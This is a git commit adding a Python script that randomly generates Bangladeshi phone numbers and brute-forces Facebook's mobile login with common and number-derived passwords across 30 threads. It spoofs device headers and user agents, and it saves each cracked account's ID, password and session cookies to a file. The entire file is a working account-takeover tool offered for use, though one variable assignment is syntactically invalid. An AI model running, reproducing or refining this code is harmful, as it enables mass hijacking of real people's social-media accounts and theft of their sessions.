ca6fa0fb2df9b91f38ec8000ff0dc5d2ac13c630
Md Mosabbir Hossain <bmads2025@gmail.com>
2025-01-20 10:05:01 +0600

    Create Random.py

---
+++ Random.py
@@ -0,0 +1,143 @@
+# RANDOM SCRIPT MOSSBBIR
+# UPDATE KORE NIBEN
+# JOIN TELEGRAM GROUP : https://t.me/mosabbirhossainsajib
+#------------------[ IMPORT ]------------------#
+import os,sys,re,random,time,string,requests
+from concurrent.futures import ThreadPoolExecutor as habib
+#------------------[ LOOP ]------------------#
+loop=0;oks=[];cps=[];user=[];ugen=[]
+#------------------[ COLOUR ]------------------#
+green="\x1b[38;5;46m";white="\x1b[38;5;15m";rad="\x1b[38;5;160m"
+#------------------[ CLEAR ]------------------#
+def clear():os.system('clear');print(logo)
+def linex():print(f'{white}-----------------------------------------------')
+#------------------[ UA ]------------------#
+for pocoxd in range(5000):
+    a='Nokia'
+    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    c=random.randrange(1, 99)
+    d='/GoBrowser/'
+    e='1.6.0.'
+    f=random.randrange(1, 99)
+    uaku2=(f'{a}{b}{c}{d}{e}{f}')
+    ugen.append(uaku2)
+#------------------[ LOGO ]------------------#
+logo = f"""
+{white}-----------------------------------------------
+ {white}[{green}√{white}] CODE BY MOSABBIR-PRO
+ {white}[{green}√{white}] RANDOM 
+{white}-----------------------------------------------"""
+#------------------[ MAIN MENU ]------------------#
+def poco():
+	clear();os.system('xdg-open https://t.me/MOSABBIR-PRO_143');print(f' {white}[{green}1{white}] START RANDOM CLONE ');print(f' {white}[{green}2{white}] EXIT CLONE ');linex();bal=input(f' {white}[{green}?{white}] SELECT : ')
+	if bal in ['1']:___Bangladesh___()
+	else:print(f' {white}[{green}√{white}] OPTION NOT FOUND BROH');exit()
+#------------------[ RANDOM MENU ]------------------#
+def ___Bangladesh___():
+	clear();os.system('xdg-open https://t.me/MOSABBIR-PRO_143');print(f' {white}[{green}√{white}] CODE : 017 | 018 | 013 | 016 | 019 ');linex();code=input(f' {white}[{green}?{white}] SELECT : ')
+	clear();os.system('xdg-open https://t.me/MOSABBIR-PRO_143');print(f' {white}[{green}√{white}] LIMIT : 2222 | 3333 | 4444 | 5555 | 9999 ');linex();limit=input(f' {white}[{green}?{white}] SELECT : ')
+	for xxx in range(int(limit)):
+		mrpoco = "".join(random.choice(string.digits) for _ in range(8))
+		user.append(mrpoco)
+	with habib(max_workers=30) as ___mrpoco___:
+		clear();total_ids=str(len(user))
+		print(f' {white}[{green}√{white}] CODE :{green} {code} {white}√ LIMIT :{green} {total_ids} ');linex()
+		for love in user:
+			ids = code + love
+			passlist = [ids,love,ids[:6],ids[:7],ids[:8],love[1:],love[2:],'১২৩৪৫৬','507080','iloveyou','free fire','Bangladesh','Bangla','@@@###']
+			___mrpoco___.submit(_P_O_C_O_,ids,passlist)
+	print('');linex();print(f' {white}[{green}√{white}] THE PROCESS HAS COMPLETED');print(f' {white}[{green}√{white}] TOTAL OK|CP IDS : '+str(len(oks))+'|'+str(len(cps)));linex();exit()
+#------------------[ RANDOM DATA VALUE ]------------------#
+def values(url=None):
+    code = {}
+    session = requests.Session()
+    try:
+        response = session.get(url).text
+        jazoest = re.search(r'name="jazoest" value="(.*?)"', response)
+        m_ts = re.search(r'name="m_ts" value="(.*?)"', response)
+        lsd = re.search(r'name="lsd" value="(.*?)"', response)
+        li = re.search(r'name="li" value="(.*?)"', response)
+        code['li'] = li.group(1) if li else random.choice(['GosCZzoF-x4TPnttnppf6vQM' 'G4sCZ-e-gi91jL0vyyhgRvVO', 'HIsCZwuKjhSwv0KKTgpDapfT', 'HosCZ7N677bvIn23tMfXsv06'])
+        code['lsd'] = lsd.group(1) if lsd else random.choice(['AVoXhSMaYhc', 'AVqPPp5vKyU', 'AVoE8plKK3k'])
+        code['m_ts'] = m_ts.group(1) if m_ts else str(int(time.time()))
+        code['jazoest'] = jazoest.group(1) if jazoest else str(random.randint(1000, 9000))
+    except Exception as e:
+        pass
+    return code
+#------------------[ RANDOM METHOD HOST ]------------------#
+def _P_O_C_O_(ids,passlist):
+    global loop,oks,cps
+    sys.stdout.write(f"\r\r {white}[{green}MOSABBIR-PRO{white}]-[{loop}|{len(oks)}|{len(cps)}] ");sys.stdout.flush()
+    ewe = requests.Session()
+    ____pokki____=random.choice(ugen)
+    try:
+        for pas in passlist:
+            MOSABBIR-PRO = values("https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100")
+            modelx = random.choice(["SM-J320F", "SM-N975F", "SM-S918B", "SM-N986U", "SM-S908U", "SM-G991B", "SM-A528B", "SM-A536B", "SM-A146U", "SM-A037U", "SM-N975F", "SM-N960F", "SM-G960U", "SM-A202F", "SM-G965U", "YA-L29", "SM-A115U", "SM-S918B", "SM-F711B", "SM-A336B", "SM-G975U", "SM-N9860", "SM-N9860", "SM-G996U", "SM-G998U", "SM-A750GN", "SM-N770F", "SM-G900F", "SM-Z130H", "SM-G900F", "SM-G900F", "SM-T800", "SM-N900V", "SAMSUNG GT-I9515", "SM-T530NU", "SM-T530", "SM-Z130H", "SM-Z130H", "SM-G360T1", "SM-A800F", "SM-T530", "SM-G928F", "SM-G925F", "SM-T817T", "SM-T355Y", "SM-J200G", "SM-N915F", "SM-P901", "SM-G531H", "SM-J701M", "SM-J111F", "SM-J105Y", "SM-J120F", "SM-T550", "SM-Z200Y", "SM-J500FN", "SM-A800F", "SM-T280", "SM-J120H", "SM-A310F", "SM-T530", "SM-T331", "SM-A510F", "SM-S920L", "SM-G925F", "SM-T670", "SM-T670", "SM-G925F", "SM-Z200F", "SM-T585", "SM-T285", "SM-N976V", "SM-G977N", "SM-G975F", "SM-G970F", "SM-F900U", "SM-A805F", "SM-A505F", "SM-G350E", "SM-G350", "SM-G350E", "SM-J326AZ", "SM-J336AZ", "GT-P3100", "SM-A202F", "SM-A260F", "SM-A145R", "SM-A136B", "SM-A546B", "SM-A736B", "SM-A530F", "SM-G885F", "SM-A805F", "SM-A910F", "SM-G8850", "SM-G316MY", "SM-G318H", "SM-G850F", "SM-G386T", "GT-I5801", "SM-C7010", "SM-C9000", "EK-GC100", "SM-G355H", "SM-G350E", "SM-G360H", "SM-G361H", "SM-G361HU", "SM-G360BT", "SM-G360T", "SM-G360BT", "SM-G361H", "SM-G361", "GT-I8730", "SM-G1650", "SM-G1650", "SM-R810", "SM-R905U", "SM-R905N", "SM-J200BT", "SM-J200G", "SM-J337R4", "SM-J337U", "SM-J337W", "SM-J337A", "SM-J337R", "SM-S327VL", "SM-J330F", "SM-J327T1", "SM-N975U", "SM-A205F"])
+            data = {
+				"m_ts": MOSABBIR-PRO.get('m_ts'),
+				"li": MOSABBIR-PRO.get('li'),
+				"try_number": 0,
+				"unrecognized_tries": 0,
+				"email": ids,
+				"prefill_contact_point": ids,
+				"prefill_source": "browser_dropdown",
+				"prefill_type": "contact_point",
+				"first_prefill_source": "browser_dropdown",
+				"first_prefill_type": "contact_point",
+				"had_cp_prefilled": True,
+				"had_password_prefilled": False,
+				"is_smart_lock": False,
+				"bi_xrwh": 0,
+				"encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas),
+				"bi_wvdp": '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
+				"jazoest": MOSABBIR-PRO.get('jazoest'),
+				"lsd": MOSABBIR-PRO.get('lsd'),}
+            headers = {
+                 'user-agent': ____pokki____,
+                 'Host': 'p.facebook.com', 
+                 'method': 'GET', 'scheme': 'https', 
+                 'x-fb-rlafr': '0', 'access-control-allow-origin': '*', 
+                 'facebook-api-version': 'v17.0', 
+                 'strict-transport-security': 'max-age=15552000', 
+                 'pragma': 'no-cache', 'cache-control': 'max-age=0', 
+                 'x-fb-request-id': 'A5ZKh_85GaagpB8XJbwc9jD', 
+                 'x-fb-trace-id': 'DKv719n6x5A', 'x-fb-rev': '1007660106', 
+                 'x-fb-debug': '0Wgri/aCTmjxPumj0+CG/zZiMXJ7STJoeBV090VKxpelr/8ZFdv2Yhf8eVXye88jFgf4VfRJ/fAhAmK5VclVPQ==', 
+                 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 
+                 'accept-language': 'en-US,en;q=0.9', 
+                 'origin': 'https://p.facebook.com', 
+                 'referer': 'https://p.facebook.com/', 
+                 'sec-ch-prefers-color-scheme': 'dark', 
+                 'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"', 
+                 'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"', 
+                 'sec-ch-ua-model': f'"{modelx}"',
+                 'sec-ch-ua-platform': '"Android"', 
+                 'sec-ch-ua-platform-version': f'"{str(random.randint(6,13))}"',
+                 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 
+                 'sec-fetch-site': 'none', 'sec-fetch-user': '?1', 
+                 'upgrade-insecure-requests': '1',}
+            url = "https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
+            response = requests.Session().post(url,data=data,headers=headers,allow_redirects = False)
+            if "c_user" in response.cookies.get_dict():
+                cookies = (";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items() ])
+                uid = re.findall('c_user=(.*);xs', cookies)[0]
+                response = str(requests.get(f'https://graph.facebook.com/'+uid+'/picture?type=normal').text)
+                if "Photoshop" in response:
+                	print(f'\r\r {white}[{green}POCO-OK{white}]{green} '+uid+' | '+pas+'\033[1;97m')
+                	#print(f'\r\r {white}[{green}COOKIES{white}]{white} '+cookies);linex()
+                	open("/sdcard/MOSABBIR-PRO-RANDOM-OK.txt","a").write(uid+"|"+pas+"|"+cookies+"\n")
+                	oks.append(ids)
+                	break
+                else:continue
+            elif 'checkpoint' in response.cookies.get_dict():
+            	uid = ewe.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
+            	#print(f'\r\r {white}[{rad}POCO-CP{white}]{rad} '+uid+' | '+pas+'\033[1;97m')
+            	open('/sdcard/MOSABBIR-PRO-RANDOM-CP','a').write(uid+'|'+pas+'\n')
+            	cps.append(ids)
+            	break
+            else:continue
+        loop+=1
+    except:pass
+#------------------[ END CODE ]------------------#
+poco()
